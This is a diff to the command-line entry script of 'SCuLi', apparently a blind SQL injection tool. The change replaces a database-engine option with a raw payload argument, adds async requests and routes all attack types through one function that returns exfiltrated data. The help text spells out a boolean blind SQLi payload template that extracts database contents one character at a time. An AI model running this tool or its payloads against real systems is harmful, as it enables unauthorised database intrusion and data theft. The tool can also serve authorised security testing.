@@ -22,12 +22,13 @@ parser = argparse.ArgumentParser(prog='SCuLi', description="A blind SQL Injector
 parser.add_argument("URL")
 parser.add_argument("type", help="Can be: basic, error, xtime, xOAST, xcustom")
 parser.add_argument("method", help="Can be: GET or POST")
-parser.add_argument("engine", help="Can be: 'Oracle', 'Microsoft', 'PostGre', 'MySQL', 'SQLite'")
+parser.add_argument("payload", help="Example: `' AND SUBSTR((SELECT <data> FROM <table> WHERE <filter>='<value>'),<index>,1)='<char>'--`")
 parser.add_argument("-d", "--delay", help="In seconds. Example: `0.5`")
 parser.add_argument("-c", "--custom", help="Dict format. Example: `{'id': '<>', 'lang': 'fr'}` [Not implemented]")
 parser.add_argument("--cookie", help="Example: `PHPSESSID=JWT; csrf=MD5-STUFF`")
 parser.add_argument("--proxy", help="Example: `http://127.0.0.1:8080`")
 parser.add_argument("-i", "--input", help="Example: `./example_input.json`")
+parser.add_argument("-s", "--speed", help="Request are now made as async requests", action="store_true")
 utils.ARGS = parser.parse_args()
 
 
@@ -36,13 +37,12 @@ if __name__ == '__main__':
     print(SCuLi)
 
     if not utils.check_args(args=args):
-        print("[error] Invalid arguments.")
         exit(1)
 
     URL = args.URL
     TYPE = args.type.lower()
     METHOD = args.method.upper()
-    ENGINE = args.engine.lower()
+    PAYLOAD = args.payload
     COOKIES = args.cookie
 
     if METHOD == "GET":
@@ -57,15 +57,7 @@ if __name__ == '__main__':
                 exit(1)
 
     try:
-        if TYPE in ["basic", "error"]:
-            exfiltred_data = head.process_basic(URL, METHOD, ENGINE, TYPE)
-        elif TYPE == "time":
-            (head.process_time(URL, METHOD, ENGINE))
-        elif TYPE == "oast":
-            (head.process_OAST(URL, METHOD, ENGINE))
-        elif TYPE == "custom":
-            BODY = args.body
-            (head.process_custom(URL, METHOD, BODY, ENGINE))
+        exfiltred_data = head.process(URL, TYPE, METHOD, PAYLOAD)
     except KeyboardInterrupt:
         print("\n[info] Process stopped.")
         exit(0)
